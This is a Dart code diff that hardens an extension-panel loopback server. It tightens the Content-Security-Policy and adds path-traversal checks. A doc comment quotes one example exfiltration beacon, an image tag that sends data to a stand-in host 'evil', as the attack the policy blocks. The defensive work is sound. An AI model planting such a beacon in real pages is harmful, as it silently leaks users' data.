@@ -28,17 +28,37 @@ import '../../notifications.dart';
 import '../../core/link.dart';
 import '../../generated/sora/core/v1/core_control.pbgrpc.dart';
 
+/// The lockdown policy for extension panels. Panels are embedded WebViews
+/// whose only sanctioned way out is the host API (the soraExt JS channel to
+/// core RPCs; net.fetch through the core exists for background workers, not
+/// panels): a panel must never make its own network requests, or a
+/// compromised panel exfiltrates data with a single request.
+///
+/// `connect-src 'none'` alone is NOT enough — it blocks only fetch/XHR,
+/// WebSocket, EventSource and beacons. Subresource loads (images, media,
+/// fonts, styles, workers) are governed by their own directives, so the
+/// policy locks those to the panel's own origin as well: an exfiltration
+/// beacon such as `<img src="https://evil/?d=...">` is refused, while the
+/// panel's own bundled assets (served from the loopback server, i.e.
+/// 'self') keep working. Script/style are allowed only inline or from the
+/// panel's own files; forms, frames and plugins are forbidden.
+const String _panelContentSecurityPolicy =
+    "default-src 'self'; connect-src 'none'; img-src 'self' data: blob:; "
+    "media-src 'self'; font-src 'self' data:; style-src 'self' 'unsafe-inline'; "
+    "script-src 'self' 'unsafe-inline'; worker-src 'none'; object-src 'none'; "
+    "base-uri 'none'; form-action 'none'; frame-src 'none'; frame-ancestors 'none'";
+
 /// Serves one directory over loopback HTTP. Bound to 127.0.0.1 with an
 /// ephemeral port; shut down when the panel closes.
 ///
 /// The panel entry HTML gets the soraExt bootstrap injected right after
 /// <head>, so `window.soraExt` exists before any page script runs.
 ///
-/// Every served response carries `Content-Security-Policy: connect-src
-/// 'none'`: panel documents must never make their own network requests —
-/// the panel's only sanctioned way out is the soraExt JS channel (net.fetch
-/// through the core exists for background workers, not panels; neither is
-/// governed by connect-src).
+/// Every served response carries [_panelContentSecurityPolicy]: panel
+/// documents must never make their own network requests — the panel's only
+/// sanctioned way out is the soraExt JS channel (net.fetch through the core
+/// exists for background workers, not panels; neither is governed by the
+/// page CSP).
 /// The entry HTML additionally carries the CSP meta tag injected at install
 /// time (core/ext extract); the header here also covers non-entry HTML
 /// files, which the navigation delegate would otherwise let the panel load
@@ -59,16 +79,51 @@ class _LocalPanelServer {
 
   Future<void> _handle(HttpRequest req) async {
     try {
-      var path = req.uri.path;
+      final path = req.uri.path;
       if (path == '/' || path.isEmpty) {
         req.response.statusCode = HttpStatus.notFound;
         await req.response.close();
         return;
       }
-      final file = File('$root${path.replaceAll('/', Platform.pathSeparator)}');
-      final canonical = file.absolute.path;
+      // Decode each path segment and reject anything that could escape the
+      // content directory: dot segments (also percent-encoded ones like
+      // %2e%2e, which Uri leaves decodable in [path]) and Windows
+      // separators. The segments are then re-joined lexically, so the
+      // mapped file cannot leave the root no matter how File.absolute
+      // treats ".." on this platform.
+      final segments = <String>[];
+      for (final raw in path.split('/')) {
+        if (raw.isEmpty) continue;
+        String seg;
+        try {
+          seg = Uri.decodeComponent(raw);
+        } on ArgumentError {
+          req.response.statusCode = HttpStatus.badRequest;
+          await req.response.close();
+          return;
+        }
+        if (seg == '.' ||
+            seg == '..' ||
+            seg.contains('/') ||
+            seg.contains('\\') ||
+            seg.contains(':')) {
+          req.response.statusCode = HttpStatus.forbidden;
+          await req.response.close();
+          return;
+        }
+        segments.add(seg);
+      }
+      if (segments.isEmpty) {
+        req.response.statusCode = HttpStatus.notFound;
+        await req.response.close();
+        return;
+      }
       final rootCanonical = Directory(root).absolute.path;
-      if (!canonical.startsWith('$rootCanonical${Platform.pathSeparator}')) {
+      final file = File(
+          '$rootCanonical${Platform.pathSeparator}${segments.join(Platform.pathSeparator)}');
+      final canonical = file.absolute.path;
+      if (canonical != '$rootCanonical${Platform.pathSeparator}${segments.join(Platform.pathSeparator)}' &&
+          !canonical.startsWith('$rootCanonical${Platform.pathSeparator}')) {
         req.response.statusCode = HttpStatus.forbidden;
         await req.response.close();
         return;
@@ -91,10 +146,11 @@ class _LocalPanelServer {
         'woff2' => ContentType('font', 'woff2'),
         _ => ContentType.binary,
       };
-      // Panel isolation (see class docs): no network for panel documents.
-      // Set before the body is written; error responses above carry no body
-      // and need no policy.
-      req.response.headers.set('Content-Security-Policy', "connect-src 'none'");
+      // Panel isolation (see the policy docs above): no network for panel
+      // documents. Set before the body is written; error responses above
+      // carry no body and need no policy.
+      req.response.headers.set(
+          'Content-Security-Policy', _panelContentSecurityPolicy);
       if (ext == 'html' && _isEntry(canonical)) {
         final html = await file.readAsString();
         req.response.write(_injectBootstrap(html));
